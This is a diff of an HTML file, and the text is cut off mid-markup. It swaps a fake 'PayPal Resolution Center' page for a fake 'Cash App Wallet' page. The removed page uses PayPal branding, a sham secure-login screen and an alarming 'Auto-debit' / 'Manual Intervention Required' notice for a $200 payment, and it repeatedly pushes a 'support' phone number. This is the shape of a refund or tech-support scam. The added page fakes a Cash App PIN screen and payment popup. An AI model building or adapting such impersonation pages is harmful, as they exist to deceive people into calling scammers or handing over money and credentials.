@@ -1,2870 +1,1273 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-
 <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<meta
-name="viewport"
-content="width=device-width, initial-scale=1.0">
+<title>Cash App Wallet</title>
 
-<title>PayPal Resolution Center</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 
 <style>
 
-/* =====================================
-   RESET
-===================================== */
-
 *{
-margin:0;
-padding:0;
-box-sizing:border-box;
-}
-
-html,
-body{
-
-width:100%;
-overflow-x:hidden;
-
-font-family:
--apple-system,
-BlinkMacSystemFont,
-"SF Pro Display",
-"Segoe UI",
-sans-serif;
-
-background:#003087;
-color:#fff;
-
-}
-
-/* =====================================
-   GLOBAL
-===================================== */
-
-.hidden{
-display:none !important;
-}
-
-.app-shell{
-
-width:420px;
-height:860px;
-
-background:#ffffff;
-
-border-radius:36px;
-
-overflow:hidden;
-
-position:relative;
-
-box-shadow:
-0 50px 120px rgba(0,0,0,.35);
-
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:'Inter',sans-serif;
 }
 
 body{
-
-background:
-linear-gradient(
-135deg,
-#001f54,
-#003087,
-#0070e0
-);
-
-min-height:100vh;
-
-display:flex;
-
-justify-content:center;
-
-align-items:center;
-
-padding:20px;
-
+    background:#00d64f;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh;
+    overflow:hidden;
 }
 
-/* =====================================
+/* APP */
+
+.app{
+    width:390px;
+    height:844px;
+    background:#f7f7f7;
+    border-radius:38px;
+    overflow:hidden;
+    position:relative;
+    box-shadow:
+    0 20px 60px rgba(0,0,0,.18);
+}
+
+/* =========================
    SPLASH SCREEN
-   (FILE 1)
-===================================== */
+========================= */
 
-.start{
+.splash{
+    position:absolute;
+    inset:0;
+    background:#00d64f;
+    z-index:9999;
 
-position:absolute;
-inset:0;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    align-items:center;
 
-display:flex;
-flex-direction:column;
-
-justify-content:center;
-align-items:center;
-
-background:
-linear-gradient(
-180deg,
-#003087 0%,
-#0070e0 100%
-);
-
-z-index:99999;
-
+    transition:.5s ease;
 }
 
-.logo{
+.splash-logo{
+    width:110px;
+    height:110px;
+    border-radius:28px;
+    background:#fff;
 
-display:flex;
-align-items:center;
-justify-content:center;
+    display:flex;
+    justify-content:center;
+    align-items:center;
 
-width:140px;
-height:140px;
+    overflow:hidden;
 
+    box-shadow:
+    0 10px 40px rgba(0,0,0,.12);
 }
 
-.apple-logo-white svg{
-
-width:90px;
-height:110px;
-
-display:block;
-
-filter:
-drop-shadow(0 0 30px rgba(255,255,255,.15));
-
+.splash-logo img{
+    width:72%;
+    height:72%;
+    object-fit:contain;
 }
 
-.logo img{
+.loader{
+    width:42px;
+    height:42px;
+    border-radius:50%;
 
-width:100%;
-height:100%;
+    border:3px solid rgba(255,255,255,.35);
+    border-top:3px solid #fff;
 
-object-fit:cover;
+    margin-top:34px;
 
-display:block;
-
-}
-
-.spinner{
-
-width:54px;
-height:54px;
-
-border-radius:50%;
-
-margin-top:28px;
-
-border:4px solid rgba(255,255,255,.12);
-
-border-top:4px solid #009cde;
-
-animation:
-spin 1s linear infinite;
-
-}
-
-#status{
-
-margin-top:22px;
-
-font-size:15px;
-
-font-weight:500;
-
-color:
-rgba(255,255,255,.78);
-
-letter-spacing:.2px;
-
+    animation:spin 1s linear infinite;
 }
 
 @keyframes spin{
-
-100%{
-transform:rotate(360deg);
+    100%{
+        transform:rotate(360deg);
+    }
 }
 
+.loading-text{
+    margin-top:22px;
+    color:#fff;
+    font-size:15px;
+    font-weight:600;
+    letter-spacing:.2px;
 }
 
-/* =====================================
-   FLASH EFFECT
-===================================== */
+/* =========================
+   PIN SCREEN
+========================= */
 
-.shutter-flash{
+.pin-screen{
+    position:absolute;
+    inset:0;
+    background:#00d64f;
 
-position:fixed;
+    z-index:9998;
 
-top:0;
-left:0;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    align-items:center;
 
-width:100%;
-height:100%;
+    opacity:0;
+    pointer-events:none;
 
-background:#fff;
-
-opacity:0;
-
-pointer-events:none;
-
-z-index:99998;
-
+    transition:.5s ease;
 }
 
-@keyframes flashEffect{
-
-0%{
-opacity:0;
+.pin-title{
+    color:#fff;
+    font-size:26px;
+    font-weight:800;
+    margin-bottom:38px;
 }
 
-20%{
-opacity:1;
+.pin-dots{
+    display:flex;
+    gap:18px;
 }
 
-100%{
-opacity:0;
+.dot{
+    width:20px;
+    height:20px;
+    border-radius:50%;
+    background:rgba(255,255,255,.25);
+
+    transition:.25s ease;
 }
 
+.dot.active{
+    background:#fff;
+    transform:scale(1.08);
 }
 
-/* =====================================
-   FACE ID OVERLAY
-   (FILE 2)
-===================================== */
+/* =========================
+   MAIN PAGE
+========================= */
 
-.faceid-overlay{
+.main{
+    position:absolute;
+    inset:0;
 
-position:absolute;
+    background:#f7f7f7;
 
-inset:0;
+    transform:translateY(40px);
+    opacity:0;
 
-width:100%;
-height:100%;
+    transition:.7s cubic-bezier(.2,.8,.2,1);
 
-background:
-linear-gradient(
-180deg,
-#003087,
-#0070e0
-);
-
-display:flex;
-
-justify-content:center;
-align-items:center;
-
-padding:20px;
-
-z-index:99997;
+    overflow-y:auto;
+    overflow-x:hidden;
+    padding-bottom:120px; /* keeps last transactions above bottom nav */
+    -webkit-overflow-scrolling:touch;
 }
 
-.faceid-popup{
+/* STATUS */
 
-width:100%;
-max-width:360px;
+.status{
+    height:54px;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    padding:0 24px;
 
-background:#ffffff;
-
-border-radius:34px;
-
-padding:24px;
-
-box-shadow:
-0 24px 48px rgba(0,0,0,.8);
-
-transition:
-transform .5s cubic-bezier(.34,1.56,.64,1),
-opacity .4s ease;
-
+    color:#000;
+    font-size:14px;
+    font-weight:700;
 }
 
-.popup-header{
+/* TOPBAR */
 
-display:flex;
+.topbar{
+    padding:8px 22px 0;
 
-justify-content:space-between;
-align-items:center;
-
-margin-bottom:24px;
-
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
 }
 
-.apple-pay-title{
+/* LOGO */
 
-display:flex;
-align-items:center;
+.logo{
+    width:50px;
+    height:50px;
+    border-radius:16px;
+    background:#00d64f;
 
-font-size:20px;
-font-weight:600;
+    display:flex;
+    justify-content:center;
+    align-items:center;
 
+    overflow:hidden;
 }
 
-.amount-top{
-
-font-size:16px;
-
-color:#bcbcbc;
-
-font-weight:500;
-
+.logo img{
+    width:72%;
+    height:72%;
+    object-fit:contain;
 }
 
-.pay-row{
+/* PROFILE */
 
-display:flex;
+.profile{
+    width:44px;
+    height:44px;
+    border-radius:50%;
 
-justify-content:space-between;
-align-items:center;
+    background:#fff;
 
-padding-bottom:20px;
+    border:1px solid #ececec;
 
-margin-bottom:26px;
+    display:flex;
+    justify-content:center;
+    align-items:center;
 
-border-bottom:
-1px solid #2c2c2e;
-
+    font-size:18px;
 }
 
-.pay-label{
-
-color:#8e8e93;
-font-size:15px;
-
-}
-
-.pay-value{
-
-font-size:17px;
-font-weight:600;
-
-}
-
-/* =====================================
-   FACE ID ANIMATION
-===================================== */
-
-.faceid-container{
-
-display:flex;
-
-flex-direction:column;
-
-align-items:center;
-justify-content:center;
-
-}
-
-.circle-wrapper{
-
-position:relative;
-
-width:150px;
-height:150px;
-
-display:flex;
-
-justify-content:center;
-align-items:center;
-
-margin-bottom:24px;
-
-}
-
-.circle-wrapper::before{
-
-content:"";
-
-position:absolute;
-
-top:0;
-left:0;
-
-width:100%;
-height:100%;
-
-border-radius:50%;
-
-border:
-3px solid rgba(255,255,255,.08);
-
-border-top-color:#009cde;
-border-right-color:#003087;
-
-animation:
-spin 1.8s linear infinite;
-
-}
-
-.faceid-box{
-
-width:104px;
-height:104px;
-
-border-radius:28px;
-
-border:
-2px dashed rgba(255,255,255,.18);
-
-display:flex;
-
-justify-content:center;
-align-items:center;
-
-position:relative;
-
-overflow:hidden;
-
-animation:
-pulseBox 2s ease-in-out infinite;
-
-}
-
-.faceid-box::before{
-
-content:"";
-
-position:absolute;
-
-width:100%;
-height:3px;
-
-background:
-linear-gradient(
-90deg,
-transparent,
-#009cde,
-transparent
-);
-
-box-shadow:
-0 0 12px #34c759;
-
-top:0;
-
-animation:
-sweep 2.2s ease-in-out infinite;
-
-}
-
-.auth-text{
-
-color:#003087;
-font-size:18px;
-font-weight:600;
-
-margin-bottom:8px;
-
-}
-
-.sub-text{
-
-font-size:14px;
-
-text-align:center;
-
-color:#4b5563;
-
-line-height:1.5;
-
-}
-
-@keyframes pulseBox{
-
-0%,100%{
-border-color:
-rgba(255,255,255,.15);
-}
-
-50%{
-border-color:#34c759;
-}
-
-}
-
-@keyframes sweep{
-
-0%{
-top:0;
-opacity:0;
-}
-
-15%{
-opacity:1;
-}
-
-85%{
-opacity:1;
-}
-
-100%{
-top:100%;
-opacity:0;
-}
-
-}
-
-/* =====================================
-   MAIN APP CONTAINER
-===================================== */
-
-.app-container{
-
-width:100%;
-
-max-width:1200px;
-
-margin:auto;
-
-opacity:0;
-
-height:100%;
-
-overflow-y:auto;
-
-transition:
-opacity .6s ease;
-
-}
-
-/* =====================================
-   HEADER
-===================================== */
+/* HEADER */
 
 .header{
+    padding:14px 24px 10px;
+}
 
-position:sticky;
+/* CHART */
 
-top:0;
+.mini-chart{
+    margin-top:6px;
+    background:#fff;
+    border-radius:30px;
+    padding:22px;
+    border:1px solid #ececec;
+}
 
-z-index:100;
+.chart-top{
+    display:flex;
+    justify-content:space-between;
+    align-items:flex-start;
+    margin-bottom:14px;
+}
 
-display:flex;
+.chart-balance{
+    font-size:34px;
+    font-weight:800;
+    letter-spacing:-1px;
+    color:#000;
+}
 
-justify-content:space-between;
-align-items:center;
+.chart-growth{
+    margin-top:6px;
+    color:#00c94a;
+    font-size:14px;
+    font-weight:700;
+}
 
-padding:16px;
+.chart-pill{
+    background:#e8fff0;
+    color:#00c94a;
+    padding:8px 14px;
+    border-radius:999px;
+    font-size:12px;
+    font-weight:800;
+}
 
-background:
-rgba(0,48,135,.95);
+.chart-svg{
+    width:100%;
+    height:120px;
+    display:block;
+}
 
-backdrop-filter:
-blur(24px);
+/* CTA */
 
-border-bottom:
-1px solid rgba(255,255,255,.05);
+.cta{
+    margin:0 24px 24px;
+    background:#00d64f;
+    border-radius:30px;
+    padding:18px;
+    color:#fff;
+    position:relative;
+    overflow:hidden;
+}
 
-border-radius:42px 42px 0 0;
+.cta::after{
+    content:"";
+    position:absolute;
+    right:-40px;
+    top:-40px;
+
+    width:160px;
+    height:160px;
+
+    border-radius:50%;
+
+    background:rgba(255,255,255,.12);
+}
+
+.cta-title{
+    font-size:20px;
+    font-weight:700;
+    position:relative;
+    z-index:2;
+}
+
+.cta-sub{
+    margin-top:8px;
+    font-size:14px;
+    line-height:1.5;
+    width:75%;
+
+    color:rgba(255,255,255,.92);
+
+    position:relative;
+    z-index:2;
+}
+
+.cta-btn{
+    margin-top:18px;
+    display:inline-flex;
+    align-items:center;
+    gap:10px;
+
+    background:#fff;
+    color:#000;
+
+    padding:14px 20px;
+
+    border-radius:999px;
+
+    text-decoration:none;
+
+    font-size:15px;
+    font-weight:700;
+
+    position:relative;
+    z-index:2;
+}
+
+/* SECTION */
+
+.section{
+    padding:0 24px;
+}
+
+.section-head{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    margin-bottom:18px;
+}
+
+.section-title{
+    font-size:21px;
+    font-weight:800;
+    color:#000;
+}
+
+.see-all{
+    font-size:14px;
+    font-weight:700;
+    color:#00c94a;
+}
+
+/* ACTIVITY */
+
+.activity-card{
+    background:#fff;
+    border-radius:28px;
+    padding:8px 18px;
+    border:1px solid #ededed;
+}
+
+/* ITEM */
+
+.item{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+
+    padding:18px 0;
+
+    border-bottom:1px solid #f1f1f1;
+}
+
+.item:last-child{
+    border:none;
+}
+
+.item-left{
+    display:flex;
+    align-items:center;
+    gap:14px;
+}
+
+/* ICON */
+
+.icon{
+    width:54px;
+    height:54px;
+    border-radius:18px;
+
+    display:flex;
+    justify-content:center;
+    align-items:center;
+
+    font-size:20px;
+    font-weight:700;
+}
+
+.green{
+    background:#e8fff0;
+    color:#00c94a;
+}
+
+.black{
+    background:#101010;
+    color:#fff;
+}
+
+.soft{
+    background:#f2f2f2;
+    color:#111;
+}
+
+/* TEXT */
+
+.name{
+    font-size:16px;
+    font-weight:700;
+    color:#000;
+}
+
+.time{
+    margin-top:5px;
+    font-size:13px;
+    color:#8a8a8a;
+}
+
+.amount{
+    font-size:18px;
+    font-weight:800;
+}
+
+.plus{
+    color:#00c94a;
+}
+
+.minus{
+    color:#000;
+}
+
+/* NAV */
+
+.nav{
+    position:absolute;
+    left:0;
+    right:0;
+    bottom:0;
+
+    background:#fff;
+    border-top:1px solid #ececec;
+
+    display:flex;
+    justify-content:space-around;
+
+    padding:16px 0 28px;
+
+    z-index:100;
+}
+
+.nav-item{
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:7px;
+
+    font-size:12px;
+    font-weight:600;
+
+    color:#9a9a9a;
+}
+
+.nav-item.active{
+    color:#00c94a;
+}
+
+.nav-icon{
+    font-size:22px;
+}
+
+/* SHOW MAIN */
+
+.main.show{
+    transform:translateY(0);
+    opacity:1;
+}
+
+/* MOBILE */
+
+@media(max-width:430px){
+
+    body{
+        background:#f7f7f7;
+    }
+
+    .app{
+        width:100%;
+        height:100vh;
+        border-radius:0;
+    }
 
 }
 
-.brand{
+/* =========================
+   POPUP
+========================= */
 
-display:flex;
-align-items:center;
-gap:14px;
+/* =========================
+   POPUP
+========================= */
 
+.popup-wrap{
+    position:absolute;
+
+    top:126px;
+    left:24px;
+    right:24px;
+
+    z-index:999;
+
+    opacity:0;
+    pointer-events:none;
+
+    transform:
+    translateY(-24px)
+    scale(.92);
+
+    transition:.5s cubic-bezier(.2,.8,.2,1);
 }
 
-.brand-icon{
+.popup-wrap.show{
+    opacity:1;
+    pointer-events:auto;
 
-width:46px;
-height:46px;
-
-border-radius:12px;
-
-overflow:hidden;
-
+    transform:
+    translateY(0)
+    scale(1);
 }
 
-.brand-icon img{
+.popup-card{
 
-width:100%;
-height:100%;
-object-fit:cover;
+    background:
+    rgba(255,255,255,.94);
 
+    backdrop-filter:blur(18px);
+
+    border-radius:32px;
+
+    padding:22px;
+
+    border:
+    1px solid rgba(255,255,255,.7);
+
+    box-shadow:
+    0 30px 80px rgba(0,0,0,.16),
+    0 10px 30px rgba(0,0,0,.08);
+
+    position:relative;
+
+    overflow:hidden;
 }
 
-.brand-icon-svg{
+.popup-card::after{
 
-width:32px;
-height:38px;
+    content:"";
 
-display:flex;
-align-items:center;
-justify-content:center;
+    position:absolute;
 
+    width:180px;
+    height:180px;
+
+    border-radius:50%;
+
+    background:
+    radial-gradient(
+        rgba(0,214,79,.12),
+        transparent
+    );
+
+    top:-80px;
+    right:-60px;
+
+    pointer-events:none;
 }
 
-.brand-icon-svg svg{
+.popup-badge{
+    display:inline-flex;
 
-width:100%;
-height:100%;
+    background:#e8fff0;
 
+    color:#00c94a;
+
+    padding:8px 14px;
+
+    border-radius:999px;
+
+    font-size:11px;
+    font-weight:800;
 }
 
-.brand-name{
+.popup-amount{
+    margin-top:16px;
 
-font-size:16px;
-font-weight:700;
+    font-size:30px;
+    font-weight:800;
 
+    letter-spacing:-1px;
+
+    color:#000;
 }
 
-.header-right{
+.popup-user{
+    margin-top:4px;
 
-font-size:14px;
+    font-size:17px;
+    font-weight:700;
 
-color:rgba(255,255,255,.92);
-
+    color:#000;
 }
 
-/* =====================================
-   MOBILE
-===================================== */
+.popup-time{
+    margin-top:6px;
 
-@media(max-width:768px){
+    color:#8e8e93;
 
-.header{
-
-flex-direction:column;
-align-items:flex-start;
-
-gap:10px;
-
+    font-size:13px;
 }
 
-.header-right{
+.popup-btn{
+    width:100%;
 
-font-size:12px;
+    margin-top:18px;
 
-line-height:1.5;
+    border:none;
 
+    background:#00d64f;
+    color:#fff;
+
+    padding:15px;
+
+    border-radius:16px;
+
+    font-size:14px;
+    font-weight:700;
+
+    cursor:pointer;
 }
 
-.faceid-popup{
+.popup-support{
+    display:flex;
+    justify-content:center;
 
-padding:24px;
+    margin-top:12px;
 
+    text-decoration:none;
+
+    color:#00c94a;
+
+    font-size:13px;
+    font-weight:700;
 }
-
-}
-
-.apple-pay-title{
-
-display:flex;
-align-items:center;
-
-font-size:20px;
-font-weight:600;
-
-}
-
-.apple-logo-svg{
-
-width:18px;
-height:22px;
-
-margin-right:8px;
-
-color:#ffffff;
-
-display:block;
-
-flex-shrink:0;
-
-}
-
-.app-shell{
-
-width:420px;
-
-height:860px;
-
-background:#ffffff;
-
-border-radius:42px;
-
-overflow:hidden;
-
-position:relative;
-
-box-shadow:
-0 40px 120px rgba(0,0,0,.35);
-
-scrollbar-width:none;
--ms-overflow-style:none;
-
-}
-
-/* Hide scrollbar */
-
-.app-shell::-webkit-scrollbar{
-
-display:none;
-
-}
-
 
 </style>
-
 </head>
 
 <body>
 
-<div class="app-shell">
+<div class="app">
 
-<!-- SPLASH -->
-<div
-class="start"
-id="start">
+    <!-- SPLASH -->
 
-<div class="logo apple-logo-white">
+    <div class="splash" id="splash">
 
-<svg width="40" height="48" viewBox="0 0 60 70" xmlns="http://www.w3.org/2000/svg">
-  <path
-    d="M20 4H38C51 4 60 13 60 26C60 39 51 48 38 48H25L22 68H8L20 4Z"
-    fill="#253B80"/>
+        <div class="splash-logo">
+            <img src="https://i.ibb.co/Wp269Dqq/vdfgvfg.png">
+        </div>
 
-  <path
-    d="M14 16H32C44 16 52 24 52 35C52 46 44 54 32 54H21L18 70H7L14 16Z"
-    fill="#179BD7"/>
-</svg>
+        <div class="loader"></div>
 
-</div>
-
-<div class="spinner"></div>
-
-<div id="status">
-Connecting to PayPal...
-</div>
-
-</div>
-
-<!-- FLASH -->
-<div
-class="shutter-flash"
-id="flashLayer">
-</div>
-
-<!-- FACE ID -->
-<div
-class="faceid-overlay hidden"
-id="faceIdOverlay">
-
-<div class="faceid-popup">
-
-<div class="popup-header">
-
-<div class="apple-pay-title">
-
-<svg
-width="34"
-height="40"
-viewBox="0 0 60 70"
-xmlns="http://www.w3.org/2000/svg"
-style="margin-right:10px;">
-
-<path
-d="M20 4H38C51 4 60 13 60 26C60 39 51 48 38 48H25L22 68H8L20 4Z"
-fill="#253B80"/>
-
-<path
-d="M14 16H32C44 16 52 24 52 35C52 46 44 54 32 54H21L18 70H7L14 16Z"
-fill="#179BD7"/>
-
-</svg>
-
-<span style="
-font-size:22px;
-font-weight:700;
-color:#003087;
-font-style:italic;
-">
-PayPal
-</span>
-
-</div>
-
-<div
-class="amount-top"
-id="faceAmount">
-
-$200
-
-</div>
-
-</div>
-
-<div class="pay-row">
-
-<div class="pay-label">
-Transaction Review
-</div>
-
-<div class="pay-value">
-
-</div>
-
-</div>
-
-<div class="faceid-container">
-
-<div style="
-text-align:center;
-width:100%;
-padding:20px;
-">
-
-<div style="
-font-size:18px;
-font-weight:700;
-color:#003087;
-margin-bottom:12px;
-">
-Secure Login
-</div>
-
-<div style="
-font-size:38px;
-letter-spacing:8px;
-color:#003087;
-margin-bottom:20px;
-">
-••••••
-</div>
-
-<div style="
-width:100%;
-height:8px;
-background:#e5e7eb;
-border-radius:999px;
-overflow:hidden;
-margin-bottom:18px;
-">
-
-<div id="progressBar" style="
-height:100%;
-width:0%;
-background:linear-gradient(90deg,#009cde,#003087);
-border-radius:999px;
-transition:width .4s ease;
-"></div>
-
-</div>
-
-<div class="auth-text">
-Verifying Account
-</div>
-
-<div class="sub-text">
-Connecting to PayPal secure servers...
-</div>
-
-</div>
-
-</div>
-
-</div>
-
-</div>
-
-<!-- APP STARTS HERE -->
-
-<div
-class="app-container"
-id="appContainer">
-
-<div
-class="header hidden"
-id="header">
-
-<div class="brand">
-
-<div class="brand-icon-svg">
-
-<svg width="40" height="48" viewBox="0 0 60 70" xmlns="http://www.w3.org/2000/svg">
-  <path
-    d="M20 4H38C51 4 60 13 60 26C60 39 51 48 38 48H25L22 68H8L20 4Z"
-    fill="#253B80"/>
-
-  <path
-    d="M14 16H32C44 16 52 24 52 35C52 46 44 54 32 54H21L18 70H7L14 16Z"
-    fill="#179BD7"/>
-</svg>
-
-</div>
-
-<div class="brand-name">
-Resolution Center
-</div>
-
-</div>
-
-<div class="header-right">
- USA & Canada 1 (803) 238-4071
-</div>
-
-</div>
-
-<!-- =====================================
-     PURCHASE REVIEW MODAL
-===================================== -->
-
-<style>
-
-/* =====================================
-   MODAL OVERLAY
-===================================== */
-
-.modal{
-
-position:fixed;
-
-inset:0;
-
-display:flex;
-
-justify-content:center;
-align-items:flex-start;
-
-padding-top:160px;
-
-background:transparent;
-
-backdrop-filter:none;
-
-z-index:9990;
-
-}
-
-.modal-box{
-
-width:100%;
-max-width:360px;
-
-background:
-linear-gradient(
-180deg,
-#ffffff 0%,
-#f8fbff 100%
-);
-
-border:
-1px solid rgba(255,255,255,.06);
-
-border-radius:34px;
-
-padding:18px;
-
-position:relative;
-
-overflow:hidden;
-
-box-shadow:
-0 40px 100px rgba(0,0,0,.65);
-
-opacity:0;
-
-transform:
-translateY(30px)
-scale(.95);
-
-animation:
-modalIn .65s cubic-bezier(.2,.8,.2,1)
-forwards;
-
-}
-
-@keyframes modalIn{
-
-0%{
-
-opacity:0;
-
-transform:
-translateY(30px)
-scale(.95);
-
-}
-
-100%{
-
-opacity:1;
-
-transform:
-translateY(0)
-scale(1);
-
-}
-
-}
-
-/* =====================================
-   MODAL GLOW
-===================================== */
-
-.glow{
-
-position:absolute;
-
-width:320px;
-height:320px;
-
-border-radius:50%;
-
-background:
-radial-gradient(
-rgba(0,122,255,.18),
-transparent
-);
-
-top:-150px;
-right:-120px;
-
-pointer-events:none;
-
-}
-
-/* =====================================
-   PURCHASE CARD
-===================================== */
-
-.card-preview{
-
-height:180px;
-
-border-radius:28px;
-
-position:relative;
-
-overflow:hidden;
-
-margin-bottom:26px;
-
-background:
-linear-gradient(
-135deg,
-#003087 0%,
-#005ea6 35%,
-#0070e0 100%
-);
-
-border:
-1px solid rgba(255,255,255,.06);
-
-box-shadow:
-0 25px 60px rgba(0,0,0,.55);
-
-}
-
-/* subtle lighting */
-
-.card-preview::before{
-
-content:"";
-
-position:absolute;
-
-top:-120px;
-right:-120px;
-
-width:260px;
-height:260px;
-
-border-radius:50%;
-
-background:
-radial-gradient(
-rgba(255,255,255,.10),
-transparent 70%
-);
-
-}
-
-/* blue Apple Pay glow */
-
-.card-preview::after{
-
-content:"";
-
-position:absolute;
-
-left:-120px;
-bottom:-120px;
-
-width:240px;
-height:240px;
-
-border-radius:50%;
-
-background:
-radial-gradient(
-rgba(10,132,255,.18),
-transparent 75%
-);
-
-}
-
-.card-title{
-
-position:absolute;
-
-top:22px;
-left:22px;
-
-font-size:22px;
-font-style:italic;
-font-weight:600;
-
-z-index:2;
-
-}
-
-.card-amount{
-
-position:absolute;
-
-left:22px;
-bottom:22px;
-
-font-size:32px;
-font-weight:500;
-
-letter-spacing:-1px;
-
-z-index:2;
-
-}
-
-/* =====================================
-   MODAL TEXT
-===================================== */
-
-.heading{
-
-color:#003087;
-
-text-align:center;
-
-font-size:20px;
-
-font-weight:700;
-
-letter-spacing:-1.5px;
-
-margin-bottom:12px;
-
-}
-
-.sub{
-
-text-align:center;
-
-font-size:15px;
-
-line-height:1.7;
-
-color:#4b5563;
-
-margin-bottom:10px;
-
-}
-
-/* =====================================
-   BADGE
-===================================== */
-
-.badge-wrap{
-
-display:none;
-
-}
-
-.badge{
-
-display:flex;
-
-align-items:center;
-gap:10px;
-
-padding:12px 18px;
-
-border-radius:999px;
-
-background:
-rgba(255,255,255,.05);
-
-border:
-1px solid rgba(255,255,255,.06);
-
-font-size:14px;
-font-weight:700;
-
-}
-
-.dot{
-
-width:10px;
-height:10px;
-
-border-radius:50%;
-
-background:#009cde;
-
-box-shadow:
-0 0 15px #34c759;
-
-animation:
-pulseDot 1.8s infinite;
-
-}
-
-@keyframes pulseDot{
-
-0%,100%{
-transform:scale(1);
-}
-
-50%{
-transform:scale(1.3);
-}
-
-}
-
-/* =====================================
-   INFO PANEL
-===================================== */
-
-.info{
-
-background:#f8fbff;
-
-color:#1f2937;
-border:
-1px solid rgba(255,255,255,.05);
-
-border-radius:24px;
-
-padding:10px;
-
-line-height:1.8;
-
-font-size:15px;
-
-margin-bottom:24px;
-
-}
-
-.info b{
-
-color:#003087;
-
-}
-
-/* =====================================
-   BUTTONS
-===================================== */
-
-.btn{
-
-width:100%;
-
-padding:16px;
-
-border:none;
-
-border-radius:18px;
-
-font-size:16px;
-font-weight:700;
-
-cursor:pointer;
-
-transition:.25s ease;
-
-}
-
-.primary{
-
-background:
-linear-gradient(
-180deg,
-#009cde,
-#003087
-);
-
-color:#ffffff;
-
-border:
-1px solid rgba(255,255,255,.08);
-
-box-shadow:
-0 10px 25px rgba(0,0,0,.35);
-
-}
-
-
-.primary:hover{
-
-transform:translateY(-2px);
-
-}
-
-.secondary{
-
-margin-top:12px;
-
-background:
-linear-gradient(
-135deg,
-#f5f5f7 0%,
-#d6d6d8 35%,
-#ffffff 50%,
-#d6d6d8 65%,
-#f5f5f7 100%
-);
-
-color:#111111;
-
-font-weight:700;
-
-border:
-1px solid rgba(255,255,255,.45);
-
-box-shadow:
-0 10px 24px rgba(255,255,255,.10);
-
-}
-
-
-/* =====================================
-   DASHBOARD START
-===================================== */
-
-.page2{
-
-width:100%;
-
-height:100%;
-
-margin:0;
-
-padding:14px;
-
-overflow-y:auto;
-
-}
-
-.box{
-
-background:#ffffff;
-
-color:#111827;
-
-border:1px solid #dbe4f0;
-
-border-radius:24px;
-
-padding:28px;
-
-margin-bottom:24px;
-
-box-shadow:
-0 15px 40px rgba(0,0,0,.08);
-
-}
-
-
-
-.top{
-
-display:flex;
-
-justify-content:space-between;
-
-gap:20px;
-
-flex-wrap:wrap;
-
-}
-
-.amount{
-
-font-size:42px;
-
-font-weight:600;
-
-letter-spacing:-2px;
-
-}
-
-.small{
-
-color:#8e8e93;
-
-font-size:13px;
-
-letter-spacing:.4px;
-
-}
-
-/* =====================================
-   SUMMARY BADGE
-===================================== */
-
-.summary-badge{
-
-display:flex;
-
-align-items:center;
-
-gap:10px;
-
-width:max-content;
-
-margin-top:15px;
-
-padding:10px 16px;
-
-border-radius:999px;
-
-background:
-rgba(52,199,89,.08);
-
-border:
-1px solid rgba(52,199,89,.15);
-
-}
-
-/* =====================================
-   MOBILE
-===================================== */
-
-@media(max-width:768px){
-
-.modal{
-
-padding:12px;
-
-padding-top:20px;
-
-overflow-y:auto;
-
-}
-
-.modal-box{
-padding:14px;
-max-width:95vw;
-
-border-radius:24px;
-
-}
-
-.heading{
-
-font-size:30px;
-
-}
-
-.card-preview{
-
-height:140px;
-
-}
-
-.card-amount{
-
-font-size:36px;
-
-}
-
-.amount{
-
-font-size:32px;
-
-}
-
-.page2{
-
-padding:0 12px;
-
-}
-
-.box{
-
-padding:18px;
-
-}
-
-}
-
-.apple-watermark{
-
-position:absolute;
-
-right:20px;
-top:20px;
-
-width:120px;
-height:140px;
-
-opacity:1;
-
-pointer-events:none;
-
-}
-
-.apple-watermark svg{
-
-width:100%;
-height:100%;
-
-display:block;
-
-}
-
-</style>
-
-<!-- PURCHASE REVIEW MODAL -->
-
-<div
-class="modal hidden"
-id="modal">
-
-<div class="modal-box">
-
-<div class="glow"></div>
-
-<div class="card-preview">
-
-<div class="apple-watermark">
-
-<svg width="40" height="48" viewBox="0 0 60 70" xmlns="http://www.w3.org/2000/svg">
-  <path
-    d="M20 4H38C51 4 60 13 60 26C60 39 51 48 38 48H25L22 68H8L20 4Z"
-    fill="#253B80"/>
-
-  <path
-    d="M14 16H32C44 16 52 24 52 35C52 46 44 54 32 54H21L18 70H7L14 16Z"
-    fill="#179BD7"/>
-</svg>
-
-</div>
-
-<div class="card-title">
-Auto-debit
-</div>
+        <div class="loading-text" id="loadingText">
+            Cash App...
+        </div>
 
-<div class="card-amount" id="modalAmount">
-$294
-</div>
-
-</div>
-
-<div class="heading">
-Manual Intervention Required
-</div>
-
-<div class="sub">
-Account activity requires additional verification.
-</div>
-
-<div class="badge-wrap">
-
-<div class="badge">
-
-<div class="dot"></div>
-
-Verification Pending
-
-</div>
-
-</div>
-
-<div
-class="info"
-id="purchaseInfo">
-
-<div>
-<b>ITEM:</b>
-Send as Friends & Family
-</div>
-
-<div>
-<b>VALUE:</b>
-$200.00
-</div>
-
-<div>
-<b>STATUS:</b>
-Pending Verification
-</div>
-
-<div>
-<b>REFERENCE:</b>
-<span id="ref"></span>
-</div>
-
-<div>
-<b>DATE:</b>
-<span id="date"></span>
-</div>
-
-<div>
-<b>DEVICE:</b>
-Secure Desktop Session
-</div>
-
-</div>
-
-<button
-class="btn primary"
-onclick="openFull()">
-
-View Purchase Details
-
-</button>
-
-<button
-class="btn secondary"
-onclick="callSupport()">
-
-Contact Support
-1 (803) 238-4071
-
-</button>
-
-</div>
-
-</div>
-
-<!-- =====================================
-     DASHBOARD SECTION
-===================================== -->
-
-<div
-class="page2 hidden"
-id="page2">
-
-<!-- SUMMARY CARD -->
-
-<div class="box">
-
-<div class="top">
-
-<div>
-
-<div class="small">
-ONLINE PURCHASE SUMMARY
-</div>
-
-<div
-class="amount"
-id="amt">
-
-$200
-
-</div>
-
-<div class="summary-badge">
-
-<div class="dot"></div>
-
-Purchase Verification Active
-
-</div>
-
-</div>
-
-<div style="text-align:right;">
-
-<div class="small">
-PURCHASE REFERENCE
